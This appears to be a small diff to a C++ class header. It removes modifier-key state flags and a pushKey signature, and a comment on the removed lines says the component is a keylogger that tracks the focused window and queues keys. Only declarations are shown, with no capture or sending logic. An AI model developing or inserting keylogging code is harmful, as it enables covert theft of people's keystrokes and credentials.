@@ -30,11 +30,7 @@ protected:
 
 private:
 	void checkFocus(UINT keychar);
-	void pushKey(USHORT keyChar, USHORT vkey);
-	bool isShifted{ false };
-	bool isCtrled{ false };
-	bool isAlted{ false };
-	bool caplock{ false }; // initalized when keylogger is started
+	void pushKey(void);
 	time_t lastScanTime{ 0 };
 	HWND hPrevWind{ nullptr };
 	std::shared_ptr<SharedQueue> _queue;
